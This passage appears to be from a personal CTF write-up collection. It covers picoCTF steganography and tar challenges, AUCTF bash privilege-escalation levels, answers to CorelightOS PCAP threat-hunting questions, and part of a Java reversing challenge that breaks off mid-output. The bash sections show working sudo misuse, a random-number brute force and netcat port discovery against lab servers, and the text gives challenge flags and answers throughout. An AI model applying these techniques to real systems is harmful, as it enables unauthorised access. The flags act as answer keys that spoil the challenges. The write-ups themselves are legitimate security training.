80 83 20 20 E2 80 83 20 20 20 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 20 20 E2 80 83 20 20 E2 80 83 20 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 20 20 E2 80 83 20 20 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 20 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 20 20 20 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 20 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 20 20 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20'
s = s.replace('E2 80 83', '0').replace('20', '1').replace(' ', '')
for i in range(0, len(s), 8):
    print(chr(int(s[i:i+8], 2)), end='')
</code></pre><h2><a class=header href=#flag-32 id=flag-32>Flag</a></h2><p><code>picoCTF{not_all_spaces_are_created_equal_dd5c2e2f77f89f3051c82bfee7d996ef}</code><h1><a class=header href=#picoctf19-like1000 id=picoctf19-like1000>PicoCTF19 like1000</a></h1><h2><a class=header href=#challenge-31 id=challenge-31>Challenge</a></h2><p>This <a href=https://2019shell1.picoctf.com/static/8694f84879d3b7c0dcf775930f4665fc/1000.tar>.tar</a> file got tarred alot. Also available at /problems/like1000_0_369bbdba2af17750ddf10cc415672f1c.<h2><a class=header href=#hints-29 id=hints-29>Hints</a></h2><p>Try and script this, it'll save you alot of time<h2><a class=header href=#solution-33 id=solution-33>Solution</a></h2><p>Assuming it was tar-ed 1000x. The file inside is 999.tar. Countdown<pre><code class=language-bash>#!/bin/bash
for i in {1000..1}
do
   tar -xvf $i.tar
   rm $i.tar
done
</code></pre><p>or<pre><code class=language-python>import tarfile

for i in range(1000,0,-1):
    tarfile.open(str(i) + '.tar').extractall()
</code></pre><h2><a class=header href=#flag-33 id=flag-33>Flag</a></h2><p><code>picoCTF{StaT31355_636f6e6e}</code><h1><a class=header href=#miscellaneous-1 id=miscellaneous-1>Miscellaneous</a></h1><h1><a class=header href=#auctf20-bash id=auctf20-bash>AUCTF20 Bash</a></h1><p>This write-up contains 5 challenges that builds on top of each other.<h2><a class=header href=#bash-1 id=bash-1>Bash 1</a></h2><h3><a class=header href=#problem-2 id=problem-2>Problem</a></h3><p>SSH into the server<p><code>ssh challenges.auctf.com -p 30040 -l level1</code><p>password: <code>aubie</code><h3><a class=header href=#solution-34 id=solution-34>Solution</a></h3><pre><code class=language-bash>$ ssh challenges.auctf.com -p 30040 -l level1
level1@challenges.auctf.com's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
&lt; REDACTED &gt;
$ ls -al
total 24
dr-xr-xr-x 1 root   root   4096 Apr  5 03:19 .
drwxr-xr-x 1 root   root   4096 Apr  4 22:16 ..
-rw-r--r-- 1 level1 level1  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 level1 level1 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 level1 level1  807 Apr  4  2018 .profile
-rw-rw-r-- 1 root   root     24 Apr  1 21:25 README
$ cat README
auctf{W3lcoM3_2_da_C7F}
</code></pre><h3><a class=header href=#flag-34 id=flag-34>Flag</a></h3><p><code>auctf{W3lcoM3_2_da_C7F}</code><h2><a class=header href=#bash-2 id=bash-2>Bash 2</a></h2><h3><a class=header href=#problem-3 id=problem-3>Problem</a></h3><p>SSH into the server<p><code>ssh challenges.auctf.com -p 30040 -l level2</code><p>password is the flag of the previous Bash challenge<h3><a class=header href=#solution-35 id=solution-35>Solution</a></h3><pre><code class=language-bash>$ ls -al
total 28
dr-xr-xr-x 1 root   root   4096 Apr  5 03:19 .
drwxr-xr-x 1 root   root   4096 Apr  4 22:16 ..
-rw-r--r-- 1 level2 level2  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 level2 level2 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 level2 level2  807 Apr  4  2018 .profile
-r--r----- 1 level3 level3   22 Apr  1 21:25 flag.txt
-r-xr-x--- 1 level3 level2  110 Apr  1 21:25 random_dirs.sh
$ cat flag.txt
cat: flag.txt: Permission denied
$ cat random_dirs.sh
#!/bin/bash

x=$RANDOM

base64 flag.txt &gt; /tmp/$x
function finish {
        rm  /tmp/$x
}
trap finish EXIT

sleep 15
</code></pre><p>The <code>flag</code> is owned by user <code>level3</code> and is in group <code>level2</code>, which is the group of my user. The flag is only readable by user <code>level3</code>.<p>The bash script under the correct user will be able to read the flag and place it into a worldwide readable file in <code>/tmp</code>.<p>Let's take a snapshot of the <code>/tmp</code> directory:<pre><code class=language-bash>$ ls /tmp/
111  12  12183  3865  alf.sh  flag.txt  hello  hi  passcodes.sh  prova.sh
</code></pre><p>Let's run the script and throw it into the background:<pre><code class=language-bash>$ sudo -u level3 ./random_dirs.sh
^Z[2] + Stopped                    sudo -u level3 ./random_dirs.sh
</code></pre><p>Let's view <code>/tmp</code> to see if any files were added:<pre><code class=language-bash>$ ls /tmp/
111  12  12183  3865  8037  alf.sh  flag.txt  hello  hi  passcodes.sh  prova.sh
$ cat /tmp/8037
YXVjdGZ7ZzB0dEBfbXV2X2Zhczd9Cg==
</code></pre><p>It's a base64 string:<pre><code class=language-bash>$ cat /tmp/8037 | base64 -d
auctf{g0tt@_muv_fas7}
</code></pre><h3><a class=header href=#flag-35 id=flag-35>Flag</a></h3><p><code>auctf{g0tt@_muv_fas7}</code><h2><a class=header href=#bash-3 id=bash-3>Bash 3</a></h2><h3><a class=header href=#problem-4 id=problem-4>Problem</a></h3><p>SSH into the server<p><code>ssh challenges.auctf.com -p 30040 -l level3</code><p>password is the flag to the previous Bash challenge<h3><a class=header href=#solution-36 id=solution-36>Solution</a></h3><pre><code class=language-bash>$ ls -al
total 28
dr-xr-xr-x 1 root   root   4096 Apr  5 03:19 .
drwxr-xr-x 1 root   root   4096 Apr  4 22:16 ..
-rw-r--r-- 1 level3 level3  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 level3 level3 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 level3 level3  807 Apr  4  2018 .profile
-r--r----- 1 level4 level4   30 Apr  1 21:25 flag.txt
-r-xr-x--- 1 level4 level3  179 Apr  1 21:25 passcodes.sh
$ cat passcodes.sh
#!/bin/bash

x=$RANDOM
echo &quot;Input the random number.&quot;
read input

if [[ &quot;$input&quot; -eq &quot;$x&quot; ]]
then
        echo &quot;AWESOME sauce&quot;
        cat flag.txt
else
        echo &quot;$input&quot;
        echo &quot;$x try again&quot;
fi
</code></pre><p>Similar file structure to last time. The script tries to ask you to guess a random number.<p>Bruteforce:<pre><code class=language-bash>$ bash -c 'for i in {0..30000}; do echo i | sudo -u level4 ./passcodes.sh; done | grep -e &quot;AWESOME&quot; -e &quot;auctf&quot;'
# 5 minute later after brute forcing with fingers crossed there is an overlap
auctf{wut_r_d33z_RaNdom_numz}
</code></pre><h3><a class=header href=#flag-36 id=flag-36>Flag</a></h3><p><code>auctf{wut_r_d33z_RaNdom_numz}</code><h2><a class=header href=#bash-4 id=bash-4>Bash 4</a></h2><h3><a class=header href=#problem-5 id=problem-5>Problem</a></h3><p>SSH into the server<p><code>ssh challenges.auctf.com -p 30040 -l level4</code><h3><a class=header href=#solution-37 id=solution-37>Solution</a></h3><pre><code class=language-bash>$ ls -al
total 28
dr-xr-xr-x 1 root   root   4096 Apr  5 03:19 .
drwxr-xr-x 1 root   root   4096 Apr  4 22:16 ..
-rw-r--r-- 1 level4 level4  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 level4 level4 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 level4 level4  807 Apr  4  2018 .profile
-r--r----- 1 level5 level5   25 Apr  1 21:25 flag.txt
-r-xr-x--- 1 level5 level4  209 Apr  1 21:25 print_file.sh
$ cat print_file.sh
#!/bin/bash

if [ ! -z &quot;$@&quot; ]
then
        cat $@ # 2&gt;/dev/null
        # if [ ! $? -eq 0 ]
        # then
        #       echo &quot;Printing error. Check file permissions&quot;
        # fi
else
        echo &quot;Please enter a file.&quot;
        echo &quot;./print_file FILENAME&quot;
fi
$ sudo -u level5 ./print_file.sh flag.txt
auctf{FunKy_P3rm1ssi0nZ}
</code></pre><p>Nothing new here.<h3><a class=header href=#flag-37 id=flag-37>Flag</a></h3><p><code>auctf{FunKy_P3rm1ssi0nZ}</code><h2><a class=header href=#bash-5 id=bash-5>Bash 5</a></h2><h3><a class=header href=#problem-6 id=problem-6>Problem</a></h3><p><code>ssh challenges.auctf.com -p 30040 -l level5</code><p>password is the previous Bash challenge flag<h3><a class=header href=#solution-38 id=solution-38>Solution</a></h3><pre><code class=language-bash>$ ls -al
total 28
dr-xr-xr-x 1 root   root   4096 Apr  5 03:19 .
drwxr-xr-x 1 root   root   4096 Apr  4 22:16 ..
-rw-r--r-- 1 level5 level5  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 level5 level5 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 level5 level5  807 Apr  4  2018 .profile
-r--r----- 1 root   root     23 Apr  1 21:25 flag.txt
-r-xr-x--- 1 root   level5  137 Apr  1 21:25 portforce.sh
$ cat portforce.sh
#!/bin/bash

x=$(shuf -i 1024-65500 -n 1)
echo &quot;Guess the listening port&quot;
input=$(nc -lp $x)
echo &quot;That was easy right? :)&quot;
cat flag.txt
</code></pre><p>It seems like the script opens <code>netcat</code> listener and waits for it to close before printing the flag. Let's verify:<pre><code class=language-bash>$ sudo -u root ./portforce.sh
Guess the listening port
</code></pre><p>It hangs there. We need to determine the port it's listening on.<p>The command <code>ps -ef</code> will show all running commands:<pre><code class=language-bash>$ echo $$
13413
$ ps -ef | grep -e $$
level5   13413 13289  0 22:48 pts/23   00:00:00 -sh
level5   27145 13413  0 22:51 pts/23   00:00:00 ps -ef
level5   27146 13413  0 22:51 pts/23   00:00:00 grep -e 13413
</code></pre><p>Great, so let's open a second window and run the listener, then run the same command above again but filter for nc instead of the UID.<pre><code class=language-bash>$ ps -ef | grep -e &quot;nc&quot;
level5    8866 19459  0 22:46 pts/3    00:00:00 nc localhost 23862
level5   12703 12692  0 22:51 pts/5    00:00:00 nc -lp 3830
level5   17378 17373  0 22:51 pts/19   00:00:00 nc -lp 54316
level5   19271 13413  0 22:52 pts/23   00:00:00 grep -e nc
root     30322 30307  0 22:52 pts/22   00:00:00 nc -lp 13177
level5   32391 32386  0 22:49 pts/25   00:00:00 nc -lp 64438
$ nc localhost 13177
^C
</code></pre><p>It's port <code>13177</code> this time. Let's go back to the netcat listener window. Looks like it exited:<pre><code class=language-bash>$ sudo -u root ./portforce.sh
Guess the listening port
That was easy right? :)
auctf{n3tc@_purt_$can}
</code></pre><h3><a class=header href=#flag-38 id=flag-38>Flag</a></h3><p><code>auctf{n3tc@_purt_$can}</code><h1><a class=header href=#corelightos-ctf-writeup id=corelightos-ctf-writeup>CorelightOS CTF Writeup</a></h1><p>This was a short two hour CTF hosted by Corelight over multiple sessions. Due to an extra space character while entering a flag, I got stuck at one problem for way too long and did not complete either PCAP 1 or 2.<p>You could either <code>ssh</code> and use the Linux command line to grep through log files or use an SIEM like <code>Splunk</code>.<p>I used both, so for now I'll only write the flag for each question then maybe one day revisit with the bash-fu.<p><a href=ctf/misc/assets/json_logs.tgz>json_logs.tgz</a><p><a href=ctf/misc/assets/tsv_logs.tgz>tsv_logs.tgz</a><h2><a class=header href=#pcap-1 id=pcap-1>PCAP 1</a></h2><h3><a class=header href=#resources-1 id=resources-1>Resources</a></h3><p>To access the dataset, use any of the following:<pre><code>Splunk (no login required)
Elastic (credentials below)
SSH to &lt;REDACTED&gt;, and look in ~/tsv_logs/pcap1
</code></pre><p>Credentials:<pre><code>Username: &lt;REDACTED&gt;
Password: &lt;REDACTED&gt;
</code></pre><p>Once you've logged to the tool of your choice, enter the flag "FreePointsPlease" below to unlock the questions for this scenario. You can always return to this question later<p><code>FreePointsPlease</code><h3><a class=header href=#question-1 id=question-1>Question 1</a></h3><p>An HTTP request is made to a specific PHP page. What is the name of that page?
<code>whoami</code><h3><a class=header href=#question-2 id=question-2>Question 2</a></h3><p>What is one of the IP addresses where that PHP page was hosted?
<code>66.228.32.31</code><h3><a class=header href=#question-3 id=question-3>Question 3</a></h3><p>What is the IP address that mail.ventascintas.com resolved to?
<code>142.4.4.112</code><h3><a class=header href=#question-4 id=question-4>Question 4</a></h3><p>What was the IP address that w01099b7.kasserver.com resolved to?
<code>85.13.157.226</code><h3><a class=header href=#question-5 id=question-5>Question 5</a></h3><p>There is a fairly "generic" X.509 self-signed certificate from a company in London. Can you figure out the domain? (Format: domainname.com)
<code>example.com</code><h3><a class=header href=#question-6 id=question-6>Question 6</a></h3><p>There is a unique JA3 hash associated with this "generic" certificate. What is that hash?
<code>35492f143de0f906215ea3aaf6ee0a74</code><h3><a class=header href=#question-7 id=question-7>Question 7</a></h3><p>What was the most recent JA3S hash associated with the previous JA3?
<code>f2e1706526fe0692ee36be58110ffc83</code><h3><a class=header href=#question-8s id=question-8s>Question 8s</a></h3><p>What specific encryption algorithm was used with the aforementioned certificate?
<code>TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA</code><h3><a class=header href=#question-9 id=question-9>Question 9</a></h3><p>Let's pick apart that X.509 further; there is a unique City that only shows up with this suspicious certificate. What is that City?
<code>London</code><h3><a class=header href=#question-10 id=question-10>Question 10</a></h3><p>What department does that previous certificate allegedly correspond to?
<code>IT Department</code><h3><a class=header href=#question-11 id=question-11>Question 11</a></h3><p>What is the SHA1 of the previously-mentioned X.509 certificate?
<code>answer not confirmed</code><h3><a class=header href=#question-12 id=question-12>Question 12</a></h3><p>As part of this traffic, there were two executables downloaded from 104.168.98.206. What is the SHA1 of the most recently downloaded?
<code>answer not confirmed</code><h3><a class=header href=#question-13 id=question-13>Question 13</a></h3><p>An executable was downloaded from 124.158.6.218. What was the name of that executable?
<code>i5pv72yr.exe</code><h3><a class=header href=#question-14 id=question-14>Question 14</a></h3><p>There was a document downloaded in this PCAP that has some Spanish flair to it. What was that document's name?
<code>answer not confirmed</code><h3><a class=header href=#question-15 id=question-15>Question 15</a></h3><p>What IP address did mail.casaroyal.cl resolve to?
<code>200.75.0.9</code><h3><a class=header href=#question-16 id=question-16>Question 16</a></h3><p>There's an email address sending suspicious emails (that maybe, maybe looks like a FireEye competitor). What is that email address?
<code>crogstrike@gchteam.com</code><h3><a class=header href=#question-17 id=question-17>Question 17</a></h3><p>An analyst was reading an introduction to threat hunting and came across a User-Agent string that looked familiar: "WinHTTP sender". What is the hostame of the infected host?
<code>SKINNER-WIN-PC</code><h3><a class=header href=#question-18 id=question-18>Question 18</a></h3><p>Let's pivot on some metadata. There are some weird user agents in this PCAP; which "WinHTTP" one only shows up once?
<code>WinHTTP sender/1.0</code><h3><a class=header href=#question-19 id=question-19>Question 19</a></h3><p>I did some JA3S hunting; there are some suspicious domains in there associated with some SMTP traffic. There's one JA3S that appears to be associated with port 80. What is the organization of the issuer, owned by GoDaddy?
<code>Starfield Technologies\\, Inc.</code><h3><a class=header href=#question-20 id=question-20>Question 20</a></h3><p>We've heard from intel that another suspicious document has been found. Email subjects included the word "dossier" - what was the name of the attachment?
<code>INF 17844.doc</code><h3><a class=header href=#question-21 id=question-21>Question 21</a></h3><p>Reverse engineering team came back; there was an odd executable in the PCAP. They've provided a SHA1 indicator of 026064006b987ed951ffce4f03c4394f557bf588. Can you determine what the downloaded file name was?
<code>i5pv72yr.exe</code><h2><a class=header href=#pcap-2 id=pcap-2>PCAP 2</a></h2><h3><a class=header href=#resources-2 id=resources-2>Resources</a></h3><p>To access the dataset, use any of the following:<pre><code>Splunk (no login required)
Elastic (credentials below)
SSH to &lt;REDACTED&gt;, and look in ~/tsv_logs/pcap2
</code></pre><p>Credentials:<pre><code>Username: &lt;REDACTED&gt;
Password: &lt;REDACTED&gt;
</code></pre><p>Once you've logged to the tool of your choice, enter the flag "FreePointsPlease" below to unlock the questions for this scenario. You can always return to this question later<p><code>FreePointsPlease</code><h3><a class=header href=#question-1-1 id=question-1-1>Question 1</a></h3><p>There are multiple site using Let's Encrypt - what is one of the Subject Names?
<code>tile.openstreetmap.org</code><h3><a class=header href=#question-2-1 id=question-2-1>Question 2</a></h3><p>Looking at all of the traffic, what is the unique JA3 hash that was observed?
<code>bc6c386f480ee97b9d9e52d472b772d8</code><h3><a class=header href=#question-3-1 id=question-3-1>Question 3</a></h3><p>Uh-oh, looks like we have some unencrypted traffic! There were some requests for /en/www/. What hostname was this to?
<code>afroamericanec.bit</code><h3><a class=header href=#question-4-1 id=question-4-1>Question 4</a></h3><p>There was a particular MIME type of which only two files were observed. What is that MIME type?
<code>answer not confirmed</code><h3><a class=header href=#question-5-1 id=question-5-1>Question 5</a></h3><p>What IP address was that MIME type downloaded from?
<code>answer not confirmed</code><h3><a class=header href=#question-6-1 id=question-6-1>Question 6</a></h3><p>A server response appears to be using stenography to hide something in a GIF image. Zeek data can be used to identify a mismatch in the MIME type and filename to help us find a find the suspicious URI that returns this image.
What was the full URI that corresponded to the newest "GIF"?
<code>/pixel.gif</code><h3><a class=header href=#question-7-1 id=question-7-1>Question 7</a></h3><p>There is one odd HTTP request that did not have a corresponding server response code. What was the server IP address of this HTTP request/response pair?
<code>188.165.62.40</code><h3><a class=header href=#question-8 id=question-8>Question 8</a></h3><p>What MIME type corresponded to this odd request?
<code>image/png</code><h3><a class=header href=#question-9-1 id=question-9-1>Question 9</a></h3><p>Let's go back and revisit one of those Let's Encrypt sites. What is the IP address for the JA3S hash of e35df3e00ca4ef31d42b34bebaa2f86e ?
<code>93.95.100.178</code><h3><a class=header href=#question-10-1 id=question-10-1>Question 10</a></h3><p>What is the two-letter country code where this IP is located?
<code>RU</code><h3><a class=header href=#question-11-1 id=question-11-1>Question 11</a></h3><p>Who is listed as one of the administrative contacts, indicated by FVV36-RIPE?
<code>REDACTED for privacy</code><h1><a class=header href=#reversing-1 id=reversing-1>Reversing</a></h1><h1><a class=header href=#auctf20-mr-game id=auctf20-mr-game>AUCTF20 Mr. Game</a></h1><h2><a class=header href=#challenge-32 id=challenge-32>Challenge</a></h2><p>My friend is learning some wacky new interpreted language and different hashing algorithms. He's hidden a flag inside this program but I cant find it...<p>He told me to connect to <code>challenges.auctf.com 30001</code> once I figured it out though. <a href=ctf/reversing/assets/mr_game_and_watch.class>mr_game_and_watch.class</a><h2><a class=header href=#solution-39 id=solution-39>Solution</a></h2><p>We were given a class file, let's see if we can decompile it into readable Java somehow.<p>Using the following decompiler <a href=http://www.javadecompilers.com/>http://www.javadecompilers.com/</a>, we get the following Java Class:<pre><code class=language-java>import java.security.MessageDigest;
import java.io.IOException;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.FileReader;
import java.util.Arrays;
import java.util.Scanner;

public class mr_game_and_watch {
    public static String secret_1;
    public static int[] secret_2;
    public static int[] secret_3;
    public static int key_2;
    public static int key_3;
    
    public static void main(final String[] array) {
        System.out.println(&quot;Welcome to the Land of Interpreted Languages!&quot;);
        System.out.println(&quot;If you are used to doing compiled languages this might be a shock... but if you hate assembly this is the place to be!&quot;);
        System.out.println(&quot;\nUnfortunately, if you hate Java, this may suck...&quot;);
        System.out.println(&quot;Good luck!\n&quot;);
        if (crackme()) {
            print_flag();
        }
    }
    
    private static boolean crackme() {
        final Scanner scanner = new Scanner(System.in);
        if (crack_1(scanner) &amp;&amp; crack_2(scanner) &amp;&amp; crack_3(scanner)) {
            System.out.println(&quot;That's correct!&quot;);
            scanner.close();
            return true;
        }
        System.out.println(&quot;Nope that's not right!&quot;);
        scanner.close();
        return false;
    }
    
    private static boolean crack_1(final Scanner scanner) {
        System.out.println(&quot;Let's try some hash cracking!! I'll go easy on you the first time. The first hash we are checking is this&quot;);
        System.out.println(invokedynamic(makeConcatWithConstants:(Ljava/lang/String;)Ljava/lang/String;, mr_game_and_watch.secret_1));
        System.out.print(&quot;Think you can crack it? If so give me the value that hashes to that!\n\t&quot;);
        return hash(scanner.nextLine(), &quot;MD5&quot;).compareTo(mr_game_and_watch.secret_1) == 0;
    }
    
    private static boolean crack_2(final Scanner scanner) {
        System.out.println(&quot;Nice work! One down, two to go ...&quot;);
        System.out.print(&quot;This next one you don't get to see, if you aren't already digging into the class file you may wanna try that out!\n\t&quot;);
        return hash(scanner.nextLine(), &quot;SHA1&quot;).compareTo(decrypt(mr_game_and_watch.secret_2, mr_game_and_watch.key_2)) == 0;
    }
    
    private static boolean crack_3(final Scanner scanner) {
        System.out.print(&quot;Nice work! Here's the last one...\n\t&quot;);
        return Arrays.equals(encrypt(hash(scanner.nextLine(), &quot;SHA-256&quot;), mr_game_and_watch.key_3), mr_game_and_watch.secret_3);
    }
    
    private static int[] encrypt(final String s, final int n) {
        final int[] array = new int[s.length()];
        for (int i = 0; i &lt; s.length(); ++i) {
            array[i] = (s.charAt(i) ^ n);
        }
        return array;
    }
    
    private static String decrypt(final int[] array, final int n) {
        String s = &quot;&quot;;
        for (int i = 0; i &lt; array.length; ++i) {
            s = invokedynamic(makeConcatWithConstants:(Ljava/lang/String;C)Ljava/lang/String;, s, (char)(array[i] ^ n));
        }
        return s;
    }
    
    private static void print_flag() {
        final String fileName = &quot;flag.txt&quot;;
        try {
            final BufferedReader bufferedReader = new BufferedReader(new FileReader(fileName));
            try {
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    System.out.println(line);
                }
                bufferedReader.close();
            } catch (Throwable t) {
                try {
                    bufferedReader.close();
                } catch (Throwable exception) {
                    t.addSuppressed(exception);
                }
                throw t;
            }
        } catch (IOException ex) {
            System.out.println(&quot;Could not find file please notify admin&quot;);
        }
    }
    
    public static String hash(final String s, final String algorithm) {
        String string = null;
        try {
            final byte[] digest = MessageDigest.getInstance(algorithm).digest(s.getBytes(&quot;UTF-8&quot;));
            final StringBuilder sb = new StringBuilder(2 * digest.length);
            final byte[] array = digest;
            for (int length = array.length, i = 0; i &lt; length; ++i) {
                sb.append(String.format(&quot;%02x&quot;, array[i] &amp; 0xFF));
            }
            string = sb.toString();
        } catch (Exception ex) {
            System.out.println(&quot;broke&quot;);
        }
        return string;
    }
    
    static {
        mr_game_and_watch.secret_1 = &quot;d5c67e2fc5f5f155dff8da4bdc914f41&quot;;
        mr_game_and_watch.secret_2 = new int[] { 114, 118, 116, 114, 113, 114, 36, 37, 38, 38, 120, 121, 33, 36, 37, 113, 117, 118, 118, 113, 33, 117, 121, 37, 119, 34, 118, 115, 114, 120, 119, 114, 36, 120, 117, 120, 38, 114, 35, 118 };
        mr_game_and_watch.secret_3 = new int[] { 268, 348, 347, 347, 269, 256, 348, 269, 256, 256, 344, 271, 271, 264, 266, 348, 257, 266, 267, 348, 269, 266, 266, 344, 267, 270, 267, 267, 348, 349, 349, 265, 349, 267, 256, 269, 270, 349, 268, 271, 351, 349, 347, 269, 349, 271, 257, 269, 344, 351, 265, 351, 265, 271, 346, 271, 266, 264, 351, 349, 351, 271, 266, 266 };
        mr_game_and_watch.key_2 = 64;
        mr_game_and_watch.key_3 = 313;
    }
}
</code></pre><p>Let's connect to the service, see what it expects:<pre><code class=language-bash>$ nc challenges.auctf.com 30001
Welcome to the Land of Interpreted Languages!
If you are used to doing compiled languages this might be a shock... but if you hate assembly this is the place to be!

Unfortunately, if you hate Java, this may suck...
Good luck!

Let's try some hash cracking!! I'll go easy on you the first time. The first hash we are checking is this
        d5c67e2fc5f5f155dff8da4bdc914f41
Think you can crack it? If so give me the value that hashes to that!
</code></pre><p>Seems like it will ask us to decrypt all three secrets, so let's reverse the code and figure out the secrets.<p><code>Secret 1</code> is a <code>MD5</code> hash<p><code>Secret 2</code> is a <code>SHA1</code> hash<p><code>Secret 3</code> is a <code>SHA-256</code> hash<p>Let's write some Java code to reconstruct the 2nd and 3rd hashes from the arrays.<pre><code class=language-java>public class Debug{
    public static void main(String []args){
        int[] secret_2 = new int[] { 114, 118, 116, 114, 113, 114, 36, 37, 38, 38, 120, 121, 33, 36, 37, 113, 117, 118, 118, 113, 33, 117, 121, 37, 119, 34, 118, 115, 114, 120, 119, 114, 36, 120, 117, 120, 38, 114, 35, 118 };
        int[] secret_3 = new int[] { 268, 348, 347, 347, 269, 256, 348, 269, 256, 256, 344, 271, 271, 264, 266, 348, 257, 266, 267, 348, 269, 266, 266, 344, 267, 270, 267, 267, 348, 349, 349, 265, 349, 267, 256, 269, 270, 349, 268, 271, 351, 349, 347, 269, 349, 271, 257, 269, 344, 351, 265, 351, 265, 271, 346, 271, 266, 264, 351, 349, 351, 271, 266, 266 };
        int key_2 = 64;
        int key_3 = 313;
        
        System.out.println(decrypt(secret_2,key_2));
        System.out.println(decrypt(secret_3,key_3));
    }
    
    private static String decrypt(final int[] array, final int n) {
        String s = &quot;&quot;;
        for (int i = 0; i &lt; array.length; ++i) {
            s += (char)(array[i] ^ n);
        }
        return s;
    }
}
</code></pre><p>Run it on a quick <a href=https://www.tutorialspoint.com/compile_java_online.php>online compiler</a>:<pre><code class=language-bash>$javac Debug.java
$java -Xmx128M -Xms16M Debug
264212deff89ade15661a59e7b632872d858f2c6
